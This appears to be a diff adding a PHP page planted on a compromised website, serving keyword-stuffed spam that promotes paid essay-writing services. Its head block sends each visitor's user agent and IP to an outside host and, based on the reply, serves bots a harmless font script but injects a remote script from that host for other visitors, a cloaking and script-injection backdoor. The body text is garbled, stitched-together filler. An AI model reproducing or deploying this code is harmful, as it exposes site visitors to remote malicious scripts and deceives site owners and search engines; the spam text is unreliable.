@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Write College Essay For Money Stink Frattini Davidian Prespective write college essay for money Technologically Guru Internationally Holdover Montreal | purplecube.in</title>
+<meta name="description" content="Do not worry about format we ll care for it. | Write College Essay For Money" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=css-font&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/css-font"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>write college essay for money It Exhilarating Discounted</h1>Strategy - is an intelligent tool and an advantage for the particular individual, regardless of its application. <p>I will be glad to discuss this request with you in detail and explain <strong>write college essay for money</strong> all the benefits and opportunities which I see and which I believe in. For me, barking is not a good thing, especially hlw the morning. Cat is gentle and delicate and does not make a lot of noise. It changes life and the life perception, accompanies with stress. Finally, this is supported in many operating systems, all modern Web browsers, and lots of other programs. Should you write an essay anyway and let your grades fail just because of a thesis statement, <a href="http://purplecube.in/custom-nursing-essay-writing">custom nursing essay writing</a> body paragraphs, and a conclusion.</p> <h2>The concept of the graphics should be italicized.</h2>Unicode system assigns a unique code of any character, regardless of platform, regardless of the program, regardless of language. <p>Also, strategy is what allows one to think and to build the desired future. A cat feels it and comes to the place where how to write california bar exam essays person feels aching. may be not bra clever as dogs, but they have their advantages. During past write college essay for money thirty years competition for business by firms that act in private practice of law has increased, now there is the consonance and nationalization of law and also there has been changed the structure of law firms. As well, I can say that a cat often makes me smile, as it is so cute. Basic ideas of strategy discussion Strategy is a general, usually not detailed plan of the activities, covering a long period of time, as a way to reach a difficult goal.</p> <h2>Plans post should not be sent to parenting newspaper supplier.</h2>Modern science defines adolescence, depending on the country (region of residence) and write college essay for money cultural and national characteristics, as well as sex. <p>Tactics is a tool for implementing strategy and it is a subject to the objectives writte the strategy. As a rule, a student already has clear career plans and an understanding of why he needs this degree. They can even cure a person, if he has a headache or some other illness. The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets. In fact, Unicode allows you to create a single software product or Web site for a variety of platforms, languages and countries without any alterations. The strategy responds to the question "how to write college essay for money get the desired".</p> <h2>After 30 years in the classroom, it may be hard to have that pension notification along on paper.</h2>As well, a company will be aware of the latest trends, of the upcoming tendencies and new approaches that it can use in its strategy and plan. <p>The strategy as a way of action becomes necessary in situations where we have to direct towards the how to write california bar exam essays if there is not enough of available resources. As a fact it is hard to overestimate meaning of the Unicode in our everyday life. I am confident that my dedication and passion for how to write california bar exam essays work will lead me to reach my destination. The strategy write college essay for money achieves the main goal through the intermediate solution of tactical problems on the axis of resources Californiia goal. And not just to receive, but to <a href="http://purplecube.in/paper-writing-service">paper writing service</a> receive with the limited resources, with minimal time and efforts. Using Unicode to multi-tier applications or software systems built in the client-server <a href="http://purplecube.in/pay-essays-online">pay essays online</a> architecture, as well as providing data on the Internet, leading to a significant reduction in support costs for these products or services compared with the case using the old encoding schemes. This encoding scheme is used by modern technologies and standards such as XML, Java, ECMA script (JavaScript), LDAP, CORBA 3. The ubiquity of the Unicode Standard is exactly like the availability of tools supporting it is now among the most important directions of development of the software industry.</p> <h2>Make sure work can be handled by you together with your plan.</h2>I enjoy a calm morning write college essay for money with a fluffy cat. <p>The two states should deepen understanding, enhance mutual respect and become good friends who are able to establish a frank dialogue and exchanges. Adolescent is boy or girl in write college essay for money the transition from childhood to adolescence. That is why, considered all mentioned above, I would like to ask my company to sponsor my participation in Business Writing course. Unicode has been adopted as a standard by computer industry leaders such as Apple, HP, IBM, Microsoft, Oracle, SAP, Sun, Sybase, Unisys and many others. I believe that quality aclifornia education is a very xalifornia factor. Law schools are more popular now and it is a great prestige to get an American legal profession these days.</p> <h2>Specified bubble fonts cheri seems like the bizarre doodling of the teenage woman.</h2>Professional and the updated ethics of this sphere is popular and is in demand. <p>And, there has been a change in bae for the legal <a href="http://purplecube.in/essay-writer-online">essay writer online</a> newsmagazines, as it is understood now that information is a clue to success. Strategy definitely is the art of achieving the desired future. I love cats more than gods and I will explain why. Unicode Overhead how to write california bar exam essays Necessity. The aim of the strategy is an effective <strong>write college essay for money</strong> use of available resources to achieve the main goal. Narration and persuasion essay In the current essay I will try to <strong>write college essay for money</strong> convince <a href="http://purplecube.in/help-with-my-essay">help with my essay</a> a friend that cats make better pets than dogs. It has always been to me to think and dream where I will study, what I want to do in life and where I would like to work.</p> <h2>For instance, the records and records government keeps copies of all government agreements.</h2>Adolescence and High School Depression As a fact, adolescence is a write college essay for money difficult period for all ezsays. <p>And his use of the data transfer between different systems prevents this data from being damaged.</p>
+                  </div>
+               </div>
